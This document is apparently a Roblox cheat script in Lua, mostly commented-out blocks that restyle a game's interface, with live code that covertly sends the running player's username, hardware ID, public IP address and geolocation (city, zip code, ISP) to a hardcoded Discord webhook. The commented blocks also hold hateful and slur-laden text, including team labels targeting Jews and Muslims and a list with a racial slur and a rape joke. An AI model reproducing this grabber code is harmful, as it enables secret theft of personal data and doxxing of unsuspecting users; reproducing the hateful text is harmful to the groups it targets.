
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
local webh = "https://discord.com/api/webhooks/1071601901839319072/rzDCjGyhC0NQqTOWGGyecAy3DJ7Mv0JIgKGTkmo-RtA5s4DdMuifRLe9FB69NAwKIX1f"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = 'hi mamasssss',
       ['description'] = 'furry',
       ['fields'] = {
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

        }
    }
  }
}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)


local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1071601901839319072/rzDCjGyhC0NQqTOWGGyecAy3DJ7Mv0JIgKGTkmo-RtA5s4DdMuifRLe9FB69NAwKIX1f"
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = dataMessage
}

syn.request(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
)



























--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

